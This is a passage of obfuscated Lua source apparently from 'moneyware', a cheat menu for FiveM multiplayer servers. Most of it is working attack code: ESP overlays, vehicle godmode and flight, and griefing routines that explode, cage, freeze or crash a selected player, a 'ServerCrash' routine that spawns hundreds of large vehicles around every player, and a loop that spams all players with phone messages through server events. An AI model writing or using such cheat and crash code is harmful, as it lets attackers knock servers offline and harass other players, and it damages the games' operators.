                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  ConnectorOneBegin_DSUGHISDUGDFG.x,
                  ConnectorOneBegin_DSUGHISDUGDFG.y,
                  ConnectorOneBegin_DSUGHISDUGDFG.z,
                  ConnectorOneEnd_DUSGIHUDGDFG.x,
                  ConnectorOneEnd_DUSGIHUDGDFG.y,
                  ConnectorOneEnd_DUSGIHUDGDFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  ConnectorTwoBegin_USDHIUFDSGDFG.x,
                  ConnectorTwoBegin_USDHIUFDSGDFG.y,
                  ConnectorTwoBegin_USDHIUFDSGDFG.z,
                  ConnectorTwoEnd_QUTGFIDYGFSUGFSG.x,
                  ConnectorTwoEnd_QUTGFIDYGFSUGFSG.y,
                  ConnectorTwoEnd_QUTGFIDYGFSUGFSG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  ConnectorThreeBegin_LDSIGHSDGHKDFSGDF.x,
                  ConnectorThreeBegin_LDSIGHSDGHKDFSGDF.y,
                  ConnectorThreeBegin_LDSIGHSDGHKDFSGDF.z,
                  ConnectorThreeEnd_UAIDGYIHDSHGODF.x,
                  ConnectorThreeEnd_UAIDGYIHDSHGODF.y,
                  ConnectorThreeEnd_UAIDGYIHDSHGODF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  Invoken(0x6B7256074AE34680, 
                  ConnectorFourBegin_SDUYFGTUDSIGDFG.x,
                  ConnectorFourBegin_SDUYFGTUDSIGDFG.y,
                  ConnectorFourBegin_SDUYFGTUDSIGDFG.z,
                  ConnectorFourEnd_ASUHYFIUDSGDFG.x,
                  ConnectorFourEnd_ASUHYFIUDSGDFG.y,
                  ConnectorFourEnd_ASUHYFIUDSGDFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                end
                if esplines_IDSUHGIUFDHGUDFHIG and esp_duhsgiudfgdfg then
                  Invoken(0x6B7256074AE34680, cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf, x, y, z, kolorek_espa_xd_IDHFUDSHUIFDSF.r, kolorek_espa_xd_IDHFUDSHUIFDSF.g, kolorek_espa_xd_IDHFUDSHUIFDSF.b, 255)
                end
              end
            end
          end
          end

          if TestSplach then
    if
        Invoken(0x475768A975D5AD17, PlayerPedId(), 7) and
            Invoken(0x475768A975D5AD17, PlayerPedId(), 6)
     then
        CreateThread(
            function()
                local x, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if x then
                    local particles = {
                    {"scr_exec_ambient_fm", "scr_ped_foot_banknotes"}
                  }
                    for k, v in pairs(particles) do
                        if v then
                            if v[1] and v[2] then
                                while not HasNamedPtfxAssetLoaded(v[1]) do
                                    Wait(0)
                                    Invoken(0xB80D8756B4668AB6, v[1])
                                end
                                Invoken(0x6C38AF3693A69A91, v[1])
                                Invoken(
                                    0xF56B8137DF10135D,
                                    v[2],
                                    coords + vec3(0.0, 0.0, 3.5),
                                    0.0,
                                    180.0,
                                    0.0,
                                    20.0,
                                    false,
                                    false,
                                    false,
                                    false
                                )
                            end
                        end
                    end
                end
            end
        )
    end
end

if speedboost then
Invoken(0x93A3996368C94158, GetVehiclePedIsIn(Invoken(0x43A66C31C68491C0, -1), false), Sliderson.Sliderki[24].value + 0.0 * 20.0)
else
Invoken(0x93A3996368C94158, GetVehiclePedIsIn(Invoken(0x43A66C31C68491C0, -1), false), 20.0)
end

if vehfly and IsPedInAnyVehicle(PlayerPedId(), false) then
            --DisableControlAction(0, 76, true)
            DisableControlAction(0, 63, true)
            DisableControlAction(0, 64, true)
            --DisableControlAction(0, 21, true)
            local veh = GetVehiclePedIsIn(PlayerPedId(), false)
            local vel = GetEntityVelocity(veh)
            local color = {r= 128, g= 0, b= 128, a= 255}
            local vehrot = GetEntityRotation(veh, 2)
            local pitch = vehrot.x
            local roll = 0
            local yaw = vehrot.z
            --SetEntityHeading(veh, GetEntityHeading(veh)) this can be used for noclip

            if IsDisabledControlPressed(0, 63) then -- A
                yaw = yaw + 1.0
                SetEntityRotation(veh, pitch, roll, yaw, 2, true)
            end
            if IsDisabledControlPressed(0, 64) then -- D
                yaw = yaw - 1.0
                SetEntityRotation(veh, pitch, roll, yaw, 2, true)
            end
            local vehpos = GetEntityCoords(GetVehiclePedIsIn(PlayerPedId(), false))
            --if IsDisabledControlPressed(0, 76) then -- space
            --  SetEntityVelocity(veh, vel.x, vel.y, vel.z + 1.0)
            --end
            if IsDisabledControlPressed(0, 21) then -- shift
                pitch = pitch - 1.0
                SetEntityRotation(veh, pitch, roll, yaw, 2, true)
            end
            if IsDisabledControlPressed(0, 62) then -- ctrl
                pitch = pitch + 1.0
                SetEntityRotation(veh, pitch, roll, yaw, 2, true)
            end
            if IsControlPressed(0, 71) then -- Coords
                SetVehicleForwardSpeed(GetVehiclePedIsIn(PlayerPedId(), false), GetEntitySpeed(GetVehiclePedIsIn(PlayerPedId(), false)) + 0.3) -- 0.3 default
            end
            if IsDisabledControlPressed(0, 72) then -- s
                SetVehicleForwardSpeed(GetVehiclePedIsIn(PlayerPedId(), false), GetEntitySpeed(GetVehiclePedIsIn(PlayerPedId(), false)) - 1.0)
            end
            SetEntityRotation(veh, pitch, roll, yaw, 2, true)

            local mph = GetEntitySpeed(GetVehiclePedIsIn(PlayerPedId(), false)) * 2.236936
            if mph > 335 and mph < 337 then
                local color = {r= 128, g= 0, b= 128, a= 255}
                --drawText('Max Speed, Derestric Max Speed to go faster', notifX - 0.17 / 2 + 0.01, notifY + 0.07, 4, color, 0.4, false, true, false)
            end

        else
            --DisableControlAction(0, 76, false)
            DisableControlAction(0, 63, false)
            DisableControlAction(0, 64, false)
            --DisableControlAction(0, 21, false)
        end

            

            if driftmodekey and Invoken(0x997ABD671D25CA0B, PlayerPedId()) then
    if Invoken(0xF3A21BCD95725A4A, 0, 21) then
        Invoken(0x222FF6A823D122E2, GetVehiclePedIsIn(PlayerPedId()), true)
    else
        Invoken(0x222FF6A823D122E2, GetVehiclePedIsIn(PlayerPedId()), false)
    end
end
if VehGodmode then
    Invoken(0x3882114BDE571AD4, GetVehiclePedIsIn(Invoken(0xD80958FC74E988A6)), true)
    Invoken(0x59BF8C3D52C92F66, GetVehiclePedIsIn(Invoken(0xD80958FC74E988A6)), false)
end

local veh2 = GetVehiclePedIsUsing(PlayerPedId())
local NitroTimer = 0
if NitroBoost and NitroTimer <= GetGameTimer() then
    if Invoken(0xE2587F8CBBD87B1D, 0, 36) then
        SetVehicleBoostActive(veh2, true)
        StartScreenEffect("RaceTurbo", 0, 0)
        SetVehicleForwardSpeed(veh2, GetEntitySpeed(veh2) + 15)
        NitroTimer = GetGameTimer() + 1000
    end
end

if VehicleBhop and IsPedInAnyVehicle(GetPlayerPed(-1), false) then
    if IsControlJustPressed(1, keys["SPACE"]) then
        local PedIsIn = GetVehiclePedIsIn(PlayerPedId(), 0.0)
           ApplyForceToEntity(PedIsIn,3,0.0,0.0,9,0.0,0.0,0.0,0.0,0.0,1,1,0.0,1)
                end
            end


if Zbmckxtpq then
  local plist = GetActivePlayers()
     for i = 1, #plist do
        XdASEvWV_moneyware(GetPlayerPed(plist[i]))
    end  
end

if HornBoost and Invoken(0x997ABD671D25CA0B, PlayerPedId(-1), true) then
    if Invoken(0xF3A21BCD95725A4A, 1, 38) then
        Invoken(0xAB54A438726D25D5, Invoken(0x6094AD011A2EA87D, PlayerPedId(-1)), 80 + 0.0)
    end
end

if ExplodeLoopyy then
local coords = GetEntityCoords(Invoken(0x43A66C31C68491C0, SelectedPlayer))
Invoken(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z-1, Sliderson.Sliderki[25].value, 100000.0, true, false, 0.0)
end

if Cage then
local coords = GetEntityCoords(Invoken(0x43A66C31C68491C0, SelectedPlayer), true)                 
local obj = Invoken(0x509D5878EB39E842, Invoken(0xD24D37CC275948CC, "prop_gascage01"), coords.x, coords.y, coords.z, true, true, true)         
end

if FreezePlayero then
Invoken(0xAAA34F8A7CB32098, Invoken(0x43A66C31C68491C0, SelectedPlayer))
Invoken(0x428CA6DBD1094446, Invoken(0x43A66C31C68491C0, SelectedPlayer), true)
else
Invoken(0x428CA6DBD1094446, Invoken(0x43A66C31C68491C0, SelectedPlayer), false)
end

if ServerCrash then
                    Citizen.CreateThread(
                        function()
                            local dj = "Avenger"
                            local dk = "CARGOPLANE"
                            local dl = "freight"
                            local dm = "dump"
                            local dn = "blimp2"
                            while not HasModelLoaded(GetHashKey(dk)) do
                                Citizen.Wait(0)
                                RequestModel(GetHashKey(dk))
                            end
                            while not HasModelLoaded(GetHashKey(dl)) do
                                Citizen.Wait(0)
                                RequestModel(GetHashKey(dl))
                            end
                            while not HasModelLoaded(GetHashKey(dj)) do
                                Citizen.Wait(0)
                                RequestModel(GetHashKey(dj))
                            end
                            while not HasModelLoaded(GetHashKey(dm)) do
                                Citizen.Wait(0)
                                RequestModel(GetHashKey(dm))
                            end
                            while not HasModelLoaded(GetHashKey(dn)) do
                                Citizen.Wait(0)
                                RequestModel(GetHashKey(dn))
                            end
                            for i = 0, 128 do
                                for ak = 100, 150 do
                                    local dl =
                                        CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                        CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                        CreateVehicle(
                                            GetHashKey(dj),
                                            2 * GetEntityCoords(GetPlayerPed(i)) + ak,
                                            true,
                                            true
                                        ) and
                                        CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                        CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                        CreateVehicle(
                                            GetHashKey(dk),
                                            2 * GetEntityCoords(GetPlayerPed(i)) - ak,
                                            true,
                                            true
                                        ) and
                                        CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                        CreateVehicle(
                                            GetHashKey(dl),
                                            2 * GetEntityCoords(GetPlayerPed(i)) + ak,
                                            true,
                                            true
                                        ) and
                                        CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                        CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                        CreateVehicle(
                                            GetHashKey(dm),
                                            2 * GetEntityCoords(GetPlayerPed(i)) + ak,
                                            true,
                                            true
                                        ) and
                                        CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                        CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) - ak, true, true) and
                                        CreateVehicle(
                                            GetHashKey(dn),
                                            2 * GetEntityCoords(GetPlayerPed(i)) + ak,
                                            true,
                                            true
                                        )
                                end
                            end
                        end
                    )
                end

                --[[

                    for pped in Enumerate_moneywarePeds() do
                        local position = GetGameplayCamCoord()
                        local pposition = GetEntityCoords(pped)
                        local dist = GetDistanceBetweenCoords(position, pposition, true)
                        SetDrawOrigin(pposition.x, pposition.y, pposition.z)
                        local witdh = 0.002 / dist
                        -- DrawRect(0.05 + 0, 0, 0.002 / dist, 1.8 / dist, 255, 255, 255, 255)
                        DrawRect(0 - witdh / 2, 0, widht, 1.8 / dist, 255, 255, 255, 255)
                        --DrawRect(0, 0.26 - 0, 0.34 / dist, 0.003 / dist, 255, 255, 255, 255)
                        ClearDrawOrigin()
                    end

                ]]

if BombShooters then
                    for i = 0, 128 do
                        if IsPedShooting(GetPlayerPed(i)) then
                            AddExplosion(GetEntityCoords(GetPlayerPed(i)), 4, 100.0, false, true, 0.0)
                        end
                    end
                end

                if PedVehFly then
                    for k in Enumerate_moneywareVehicles() do
                        RequestControlOnce(k)
                        ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    end
                end

                if NoisyCars then
                    for k in Enumerate_moneywareVehicles() do
                        SetVehicleAlarmTimeLeft(k, 500)
                    end
                end

                if DisCars then
                    local plist = GetActivePlayers()
                    for i = 1, #plist do
                        if IsPedInAnyVehicle(GetPlayerPed(plist[i]), true) then
                            ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                        end
                    end
                end

                if DisGuns then
                    local plist = GetActivePlayers()
                    for i = 1, #plist do
                        if IsPedShooting(GetPlayerPed(plist[i])) then
                            ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                        end
                    end
                end

if crashplayer then
for bbb = 0,90 do
for i_didsfyg98sduriesdfg=1, #props_IDHSOGLFDSKGDUHIOSSD do
        Citizen.Wait(5)
        local prop_dsugusiddfsg = Invoken(0x509D5878EB39E842, Invoken(0xD24D37CC275948CC, props_IDHSOGLFDSKGDUHIOSSD[i_didsfyg98sduriesdfg]), 0, 0, 0, true, true, true)
        Invoken(0x6B9BBD38AB0796DF, 
        prop_dsugusiddfsg,
        Invoken(0x43A66C31C68491C0, SelectedPlayer),
        Invoken(0x3F428D08BE5AAE31, Invoken(0x43A66C31C68491C0, SelectedPlayer), 57005),
        0.4,
        0,
        0,
        0,
        270.0,
        60.0,
        true,
        true,
        false,
        true,
        1,
        true
        )
    end
end

end


if GcPhone then
                    for i = 0, 450 do
                        TriggerPrivateEvent(
                            false,
                            "gcPhone:sendMessage",
                            GetPlayerServerId(i),
                            5000,
                            "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車"
                        )
                        TriggerPrivateEvent(
                            false,
                            "gcPhone:sendMessage",
                            num,
                            "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車"
                        )
                        TriggerPrivateEvent(
                            false,
                            "gcPhone:sendMessage",
                            5000,
                            num,
                            "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車"
                        )
                    end
                end



                


    end
end)






